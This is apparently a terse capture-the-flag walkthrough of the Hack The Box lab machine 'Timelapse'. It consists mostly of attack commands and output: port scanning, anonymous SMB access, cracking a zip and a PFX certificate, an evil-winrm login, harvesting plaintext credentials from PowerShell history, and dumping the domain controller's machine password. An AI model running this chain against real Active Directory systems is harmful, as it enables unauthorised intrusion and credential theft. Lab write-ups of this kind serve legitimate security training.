# scanning
* `TCP` Scan
TARGET=10.10.11.152 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-04-22 07:01:48Z)
135/tcp   open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack ttl 127
464/tcp   open  kpasswd5?         syn-ack ttl 127
593/tcp   open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack ttl 127
3268/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 127
5986/tcp  open  ssl/http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2022-04-22T07:03:20+00:00; +8h01m37s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
58217/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC

timelapse.htb0
dc01.timelapse.htb

> smbclient -L \\\\10.10.11.152 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server shar

> smbclient -N \\\\10.10.11.152\\shares
get files from get and helpdesk

> fcrackzip -D -u -p '/usr/share/wordlists/rockyou.txt' winrm_backup.zip 
PASSWORD FOUND!!!!: pw == `supremelegacy`

* extracted
legacyy_dev_auth.pfx

> pfx2john legacyy_dev_auth.pfx > pfx.john
> john --wordlist=/usr/share/wordlists/rockyou.txt pfx.john
`thuglegacy`

* get cert and private key
> openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
> openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key

* winrm
> evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u

# pe
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


* upload p.exe
[+] Searching known files that can contain creds in home
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\legacyy\NTUSER.DAT
    C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

> cat ConsoleHost_history.txt 
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

`svc_deploy`
`E3R$Q62^12p7PLlC%KWaxuaV`

> python3 dc_dump.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb -l 10.10.11.152
`DC01$:CgFq{OoI+,$qHG!Z2su#-c8+`


C:\Users\legacyy\desktop> type user.txt

C:\Users\TRX\desktop> type root.txt

# ref
https://chowdera.com/2022/04/202204042238391625.html